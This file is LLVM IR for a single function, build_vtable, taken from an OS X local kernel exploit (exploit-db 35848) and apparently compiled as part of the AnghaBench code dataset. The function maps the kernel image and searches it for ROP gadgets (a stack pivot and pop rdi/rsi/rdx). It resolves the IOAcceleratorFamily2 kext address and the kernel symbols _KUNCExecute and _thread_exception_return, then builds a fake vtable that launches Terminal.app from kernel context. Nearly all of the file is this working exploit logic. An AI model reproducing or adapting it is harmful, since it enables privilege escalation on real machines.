; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_35848.c_build_vtable.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_35848.c_build_vtable.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i64 }

@.str = private unnamed_addr constant [13 x i8] c"/mach_kernel\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@MAP_FILE = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@__const.build_vtable.pivot_gadget_bytes = private unnamed_addr constant [9 x i32] [i32 80, i32 1, i32 0, i32 0, i32 91, i32 65, i32 92, i32 65, i32 94], align 16
@.str.1 = private unnamed_addr constant [28 x i8] c"offset of pivot gadget: %p\0A\00", align 1
@__const.build_vtable.pop_rdi_ret_gadget_bytes = private unnamed_addr constant [2 x i32] [i32 95, i32 195], align 4
@.str.2 = private unnamed_addr constant [34 x i8] c"offset of pop_rdi_ret gadget: %p\0A\00", align 1
@__const.build_vtable.pop_rsi_ret_gadget_bytes = private unnamed_addr constant [2 x i32] [i32 94, i32 195], align 4
@.str.3 = private unnamed_addr constant [34 x i8] c"offset of pop_rsi_ret gadget: %p\0A\00", align 1
@__const.build_vtable.pop_rdx_ret_gadget_bytes = private unnamed_addr constant [2 x i32] [i32 90, i32 195], align 4
@.str.4 = private unnamed_addr constant [34 x i8] c"offset of pop_rdx_ret gadget: %p\0A\00", align 1
@.str.5 = private unnamed_addr constant [37 x i8] c"com.apple.iokit.IOAcceleratorFamily2\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"0x%016llx\0A\00", align 1
@.str.7 = private unnamed_addr constant [13 x i8] c"_KUNCExecute\00", align 1
@.str.8 = private unnamed_addr constant [25 x i8] c"_thread_exception_return\00", align 1
@.str.9 = private unnamed_addr constant [61 x i8] c"/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32* @build_vtable(i32 %0, i64* %1) #0 {
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.stat, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32*, align 8
  %11 = alloca [9 x i32], align 16
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca [2 x i32], align 4
  %16 = alloca i32*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca [2 x i32], align 4
  %20 = alloca i32*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [2 x i32], align 4
  %24 = alloca i32*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca [25 x i32], align 16
  %32 = alloca i32*, align 8
  store i32 %0, i32* %4, align 4
  store i64* %1, i64** %5, align 8
  store i32 2097152, i32* %6, align 4
  %33 = load i32, i32* %4, align 4
  %34 = load i32, i32* %6, align 4
  %35 = add nsw i32 %34, %33
  store i32 %35, i32* %6, align 4
  %36 = load i32, i32* @O_RDONLY, align 4
  %37 = call i32 @open(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i32 %36)
  store i32 %37, i32* %7, align 4
  %38 = load i32, i32* %7, align 4
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %41, label %40

40:                                               ; preds = %2
  store i32* null, i32** %3, align 8
  br label %182

41:                                               ; preds = %2
  %42 = load i32, i32* %7, align 4
  %43 = call i32 @fstat(i32 %42, %struct.stat* %8)
  %44 = getelementptr inbounds %struct.stat, %struct.stat* %8, i32 0, i32 0
  %45 = load i64, i64* %44, align 8
  store i64 %45, i64* %9, align 8
  %46 = load i64, i64* %9, align 8
  %47 = load i32, i32* @PROT_READ, align 4
  %48 = load i32, i32* @MAP_FILE, align 4
  %49 = load i32, i32* @MAP_PRIVATE, align 4
  %50 = or i32 %48, %49
  %51 = load i32, i32* %7, align 4
  %52 = call i32* @mmap(i32* null, i64 %46, i32 %47, i32 %50, i32 %51, i32 0)
  store i32* %52, i32** %10, align 8
  %53 = load i32*, i32** %10, align 8
  %54 = icmp ne i32* %53, null
  br i1 %54, label %56, label %55

55:                                               ; preds = %41
  store i32* null, i32** %3, align 8
  br label %182

56:                                               ; preds = %41
  %57 = bitcast [9 x i32]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %57, i8* align 16 bitcast ([9 x i32]* @__const.build_vtable.pivot_gadget_bytes to i8*), i64 36, i1 false)
  %58 = load i32*, i32** %10, align 8
  %59 = load i64, i64* %9, align 8
  %60 = getelementptr inbounds [9 x i32], [9 x i32]* %11, i64 0, i64 0
  %61 = call i32* @memmem(i32* %58, i64 %59, i32* %60, i32 36)
  store i32* %61, i32** %12, align 8
  %62 = load i32*, i32** %12, align 8
  %63 = load i32*, i32** %10, align 8
  %64 = ptrtoint i32* %62 to i64
  %65 = ptrtoint i32* %63 to i64
  %66 = sub i64 %64, %65
  %67 = sdiv exact i64 %66, 4
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %13, align 4
  %69 = load i32, i32* %13, align 4
  %70 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i32 %69)
  %71 = load i32, i32* %6, align 4
  %72 = load i32, i32* %13, align 4
  %73 = add nsw i32 %71, %72
  store i32 %73, i32* %14, align 4
  %74 = bitcast [2 x i32]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %74, i8* align 4 bitcast ([2 x i32]* @__const.build_vtable.pop_rdi_ret_gadget_bytes to i8*), i64 8, i1 false)
  %75 = load i32*, i32** %10, align 8
  %76 = load i64, i64* %9, align 8
  %77 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %78 = call i32* @memmem(i32* %75, i64 %76, i32* %77, i32 8)
  store i32* %78, i32** %16, align 8
  %79 = load i32*, i32** %16, align 8
  %80 = load i32*, i32** %10, align 8
  %81 = ptrtoint i32* %79 to i64
  %82 = ptrtoint i32* %80 to i64
  %83 = sub i64 %81, %82
  %84 = sdiv exact i64 %83, 4
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %17, align 4
  %86 = load i32, i32* %17, align 4
  %87 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.2, i64 0, i64 0), i32 %86)
  %88 = load i32, i32* %6, align 4
  %89 = load i32, i32* %17, align 4
  %90 = add nsw i32 %88, %89
  store i32 %90, i32* %18, align 4
  %91 = bitcast [2 x i32]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %91, i8* align 4 bitcast ([2 x i32]* @__const.build_vtable.pop_rsi_ret_gadget_bytes to i8*), i64 8, i1 false)
  %92 = load i32*, i32** %10, align 8
  %93 = load i64, i64* %9, align 8
  %94 = getelementptr inbounds [2 x i32], [2 x i32]* %19, i64 0, i64 0
  %95 = call i32* @memmem(i32* %92, i64 %93, i32* %94, i32 8)
  store i32* %95, i32** %20, align 8
  %96 = load i32*, i32** %20, align 8
  %97 = load i32*, i32** %10, align 8
  %98 = ptrtoint i32* %96 to i64
  %99 = ptrtoint i32* %97 to i64
  %100 = sub i64 %98, %99
  %101 = sdiv exact i64 %100, 4
  %102 = trunc i64 %101 to i32
  store i32 %102, i32* %21, align 4
  %103 = load i32, i32* %21, align 4
  %104 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i32 %103)
  %105 = load i32, i32* %6, align 4
  %106 = load i32, i32* %21, align 4
  %107 = add nsw i32 %105, %106
  store i32 %107, i32* %22, align 4
  %108 = bitcast [2 x i32]* %23 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %108, i8* align 4 bitcast ([2 x i32]* @__const.build_vtable.pop_rdx_ret_gadget_bytes to i8*), i64 8, i1 false)
  %109 = load i32*, i32** %10, align 8
  %110 = load i64, i64* %9, align 8
  %111 = getelementptr inbounds [2 x i32], [2 x i32]* %23, i64 0, i64 0
  %112 = call i32* @memmem(i32* %109, i64 %110, i32* %111, i32 8)
  store i32* %112, i32** %24, align 8
  %113 = load i32*, i32** %24, align 8
  %114 = load i32*, i32** %10, align 8
  %115 = ptrtoint i32* %113 to i64
  %116 = ptrtoint i32* %114 to i64
  %117 = sub i64 %115, %116
  %118 = sdiv exact i64 %117, 4
  %119 = trunc i64 %118 to i32
  store i32 %119, i32* %25, align 4
  %120 = load i32, i32* %25, align 4
  %121 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0), i32 %120)
  %122 = load i32, i32* %6, align 4
  %123 = load i32, i32* %25, align 4
  %124 = add nsw i32 %122, %123
  store i32 %124, i32* %26, align 4
  %125 = load i32*, i32** %10, align 8
  %126 = load i64, i64* %9, align 8
  %127 = call i32 @munmap(i32* %125, i64 %126)
  %128 = load i32, i32* %7, align 4
  %129 = call i32 @close(i32 %128)
  %130 = call i32 @kext_load_addr(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0))
  %131 = load i32, i32* %4, align 4
  %132 = add nsw i32 %130, %131
  %133 = add nsw i32 %132, 28544
  store i32 %133, i32* %27, align 4
  %134 = load i32, i32* %27, align 4
  %135 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0), i32 %134)
  %136 = call i32 @kernel_symbol(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.7, i64 0, i64 0))
  %137 = load i32, i32* %4, align 4
  %138 = add nsw i32 %136, %137
  store i32 %138, i32* %28, align 4
  %139 = call i32 @kernel_symbol(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.8, i64 0, i64 0))
  %140 = load i32, i32* %4, align 4
  %141 = add nsw i32 %139, %140
  store i32 %141, i32* %29, align 4
  store i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.9, i64 0, i64 0), i8** %30, align 8
  %142 = getelementptr inbounds [25 x i32], [25 x i32]* %31, i64 0, i64 0
  store i32 0, i32* %142, align 4
  %143 = getelementptr inbounds i32, i32* %142, i64 1
  store i32 0, i32* %143, align 4
  %144 = getelementptr inbounds i32, i32* %143, i64 1
  store i32 0, i32* %144, align 4
  %145 = getelementptr inbounds i32, i32* %144, i64 1
  %146 = load i32, i32* %27, align 4
  store i32 %146, i32* %145, align 4
  %147 = getelementptr inbounds i32, i32* %145, i64 1
  %148 = load i32, i32* %14, align 4
  store i32 %148, i32* %147, align 4
  %149 = getelementptr inbounds i32, i32* %147, i64 1
  store i32 0, i32* %149, align 4
  %150 = getelementptr inbounds i32, i32* %149, i64 1
  store i32 0, i32* %150, align 4
  %151 = getelementptr inbounds i32, i32* %150, i64 1
  store i32 0, i32* %151, align 4
  %152 = getelementptr inbounds i32, i32* %151, i64 1
  store i32 0, i32* %152, align 4
  %153 = getelementptr inbounds i32, i32* %152, i64 1
  store i32 0, i32* %153, align 4
  %154 = getelementptr inbounds i32, i32* %153, i64 1
  store i32 0, i32* %154, align 4
  %155 = getelementptr inbounds i32, i32* %154, i64 1
  store i32 0, i32* %155, align 4
  %156 = getelementptr inbounds i32, i32* %155, i64 1
  store i32 0, i32* %156, align 4
  %157 = getelementptr inbounds i32, i32* %156, i64 1
  store i32 0, i32* %157, align 4
  %158 = getelementptr inbounds i32, i32* %157, i64 1
  store i32 0, i32* %158, align 4
  %159 = getelementptr inbounds i32, i32* %158, i64 1
  store i32 0, i32* %159, align 4
  %160 = getelementptr inbounds i32, i32* %159, i64 1
  store i32 0, i32* %160, align 4
  %161 = getelementptr inbounds i32, i32* %160, i64 1
  %162 = load i32, i32* %18, align 4
  store i32 %162, i32* %161, align 4
  %163 = getelementptr inbounds i32, i32* %161, i64 1
  %164 = load i8*, i8** %30, align 8
  %165 = ptrtoint i8* %164 to i32
  store i32 %165, i32* %163, align 4
  %166 = getelementptr inbounds i32, i32* %163, i64 1
  %167 = load i32, i32* %22, align 4
  store i32 %167, i32* %166, align 4
  %168 = getelementptr inbounds i32, i32* %166, i64 1
  store i32 0, i32* %168, align 4
  %169 = getelementptr inbounds i32, i32* %168, i64 1
  %170 = load i32, i32* %26, align 4
  store i32 %170, i32* %169, align 4
  %171 = getelementptr inbounds i32, i32* %169, i64 1
  store i32 0, i32* %171, align 4
  %172 = getelementptr inbounds i32, i32* %171, i64 1
  %173 = load i32, i32* %28, align 4
  store i32 %173, i32* %172, align 4
  %174 = getelementptr inbounds i32, i32* %172, i64 1
  %175 = load i32, i32* %29, align 4
  store i32 %175, i32* %174, align 4
  %176 = call i32* @malloc(i32 100)
  store i32* %176, i32** %32, align 8
  %177 = load i32*, i32** %32, align 8
  %178 = getelementptr inbounds [25 x i32], [25 x i32]* %31, i64 0, i64 0
  %179 = call i32 @memcpy(i32* %177, i32* %178, i32 100)
  %180 = load i64*, i64** %5, align 8
  store i64 100, i64* %180, align 8
  %181 = load i32*, i32** %32, align 8
  store i32* %181, i32** %3, align 8
  br label %182

182:                                              ; preds = %56, %55, %40
  %183 = load i32*, i32** %3, align 8
  ret i32* %183
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @fstat(i32, %struct.stat*) #1

declare dso_local i32* @mmap(i32*, i64, i32, i32, i32, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32* @memmem(i32*, i64, i32*, i32) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @munmap(i32*, i64) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @kext_load_addr(i8*) #1

declare dso_local i32 @kernel_symbol(i8*) #1

declare dso_local i32* @malloc(i32) #1

declare dso_local i32 @memcpy(i32*, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
